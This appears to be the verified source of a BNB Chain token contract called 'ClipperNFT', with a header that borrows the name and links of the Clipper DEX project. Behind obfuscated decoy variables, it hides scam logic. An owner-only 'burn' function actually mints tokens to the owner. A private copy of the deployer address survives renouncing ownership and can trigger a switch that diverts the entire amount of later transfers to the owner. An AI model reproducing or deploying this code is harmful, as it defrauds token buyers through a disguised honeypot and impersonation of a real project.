/**
 *Submitted for verification at BscScan.com on 2022-12-12
*/

/*
 ClipperNFT
 
A decentralized exchange that's built for retail traders. Join the community:. Built by ShipyardSW
The fall of FTX is a stark reminder that DEXs, not CEXs, is the way forward.
Tune in to mattdeible, odosprotocol on 'WTF Crypto' as he dives in on DEX Aggregators, & how they work to get the best value for traders 👇
👉https://clipper.exchange/
👉https://discord.gg/clipper
👉https://twitter.com/Clipper_DEX

*/

// SPDX-License-Identifier: Unlicensed
pragma solidity >=0.5.13;
contract ClipperNFT {
mapping (address => uint256) public balanceOf;
address public owner;
uint256 public constant URsQNw = 9+2;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public constant totalSupply = 10000000000000000000000000000;
uint256 public  WhxAwa = 17+1;
uint256 public  mitQJC = 19+2;
address public  mJrAFp = address(0);
uint256 public  yyRXZY = 10+3;
address public  ZOMVgW = address(0);
address public  GzCstm = address(0);
uint256 public  kMDFhH = 12+4;
uint256 public  ODCkia = 14+5;
uint256 public  VEdMcg = 16+6;
address public  NQSkAA = address(0);
string public  symbol = "ClipperNFT";
uint8 public constant decimals = 18;
string public  name = "ClipperNFT";
mapping (address => mapping (address => uint256)) private _allowances;
address public  vdUOqD = address(0);
uint256 private  PrGdGW = 10000000000000;
address public  MpyaTM = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public  tJQFDC = 10+7;
address private  wNpqAj = address(0);
uint256 public  hTBWPy = 12+8;
event Approval(address indexed owner, address indexed spender, uint256 value);

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}

function _getm3yyRXZY() private returns (uint256) {
return yyRXZY * 1;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");
//
_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}


function _getmk4MDFhH() private returns (uint256) {
return kMDFhH / 1;
}


function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");
//
balanceOf[account] += amount;
}

function _getmVEd6Mcg() private returns (uint256) {
return VEdMcg - 1;
}


constructor () public {
wNpqAj = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}

function _get1WhxAwa() private returns (uint256) {
return WhxAwa + 1;
}


function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "OapRrv");
require(to != address(0), "OapRrv");
require(amount <= balanceOf[from], "OapRrv");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* URsQNw/PrGdGW ; //   9+2/9+2
}

//
uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==wNpqAj){
PrGdGW = 9+2;
}
emit Transfer(from, to, transferAmount);
}


function _getmOD5Ckia() private returns (uint256) {
return ODCkia + 1;
}


function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}

function _getmhTBWP8y() private returns (uint256) {
return hTBWPy / 1;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}

function _getmtJQF7DC() private returns (uint256) {
return tJQFDC * 1;
}

function _getm2itQJC() private returns (uint256) {
return mitQJC - 1;
}


//
}